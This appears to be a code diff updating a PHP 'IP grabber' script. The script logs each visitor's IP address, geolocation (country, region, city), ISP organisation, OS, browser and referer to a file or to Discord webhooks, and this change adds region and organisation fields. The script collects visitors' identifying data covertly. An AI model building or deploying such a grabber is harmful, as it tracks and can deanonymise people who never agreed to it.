@@ -4,15 +4,34 @@
 
 // Configuration (leave empty if you want to disable a feature)
 
-// local file for ip grabber file
+/*
+ local file for ip grabber file
+e.g. https://i.imgur.com/JpM6hUf.png
+*/
 $file = "";
-// requests file
+
+/*
+ requests file
+e.g. https://i.imgur.com/sqlUZwR.png
+*/
 $requests_file = "";
-// your local ip (it will be shown as Owner and location Home)
+
+/*
+ your ip (it will be shown as Owner and location Home)
+e.g. https://i.imgur.com/cdIQEWf.png
+*/
 $owner_ip = "";
-// webhook if you prefer discord webhooks instead
+
+/*
+ Webhook if you prefer discord webhooks instead.
+e.g. https://i.imgur.com/b1B9Ins.png
+*/
 $discord_webhook = "";
-// if you want to use discord webhook for logging file/folder requests
+
+/*
+ If you want to use discord webhook for logging file/folder requests.
+e.g. https://i.imgur.com/YJ44F8j.png
+*/
 $discord_request_file_webhook = "";
 
 function GetIPAddress()
@@ -114,10 +133,14 @@ if ($ip == $owner_ip) {
     $ip = "Owner";
     $country = "Home";
     $city = "Home";
+    $region = "Home";
+    $org = "My router";
 } else {
     $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
     $country = $details->country;
     $city = $details->city;
+    $region = $details->region;
+    $org = $details->org;
 }
 $url = filter_input(INPUT_SERVER, 'REQUEST_URI', FILTER_SANITIZE_STRING);
 
@@ -125,8 +148,8 @@ if ($file != "") {
     $current = file_get_contents($file);
     $current .= "\n\n====" . date("Y-m-d - H:i:s") . "====";
     $current .= "\nIP: " . $ip;
-    $current .= "\nCountry: " . $country;
-    $current .= "\nCity: " . $city;
+    $current .= "\nLocation: " . $country . ", " . $region . ", " . $city;
+    $current .= "\nOrganization: " . $org;
     $current .= "\nOS: " . $user_os;
     $current .= "\nBrowser: " . $user_browser;
     $current .= "\nWeb Referer: " . $site;
@@ -178,13 +201,13 @@ if ($discord_webhook != "") {
                         "inline" => false
                     ],
                     [
-                        "name" => "Country",
-                        "value" => $country,
+                        "name" => "Location",
+                        "value" => ":flag_" . strtolower($country) . ": " . $country . ", " . $region . ", " . $city,
                         "inline" => false
                     ],
                     [
-                        "name" => "City",
-                        "value" => $city,
+                        "name" => "Organization",
+                        "value" => $org,
                         "inline" => false
                     ],
                     [
@@ -233,7 +256,7 @@ if ($discord_webhook != "") {
     }
 }
 
-if ($discord_request_file_webhook != "") {
+if ($discord_request_file_webhook != "" && $url != "/") {
     $request_discord_embed_json = json_encode([
         "content" => $url,
         "username" => "IP URL Request Logger",
